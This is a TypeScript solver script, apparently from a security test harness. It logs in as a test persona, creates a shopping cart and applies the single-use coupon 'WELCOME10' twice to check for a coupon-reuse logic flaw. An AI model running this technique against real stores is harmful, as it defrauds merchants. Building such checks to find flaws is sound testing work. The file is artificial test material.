// Create a cart and apply the same single-use promotion code to it twice.
import { buildPath } from '../../truth/matrix-helpers.ts'
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const created = await ctx.fetch(buildPath(ctx.plan, 'createCart'), {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: '{}',
  })
  const cart = (await created.json().catch(() => ({}))) as { id?: string }
  if (!cart.id) return
  const codeField = ctx.plan.params['couponCode'] ?? 'couponCode'
  const path = buildPath(ctx.plan, 'applyCoupon', { cartId: cart.id })
  const apply = (): Promise<Response> =>
    ctx.fetch(path, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ [codeField]: 'WELCOME10' }),
    })
  await apply()
  await apply()
}
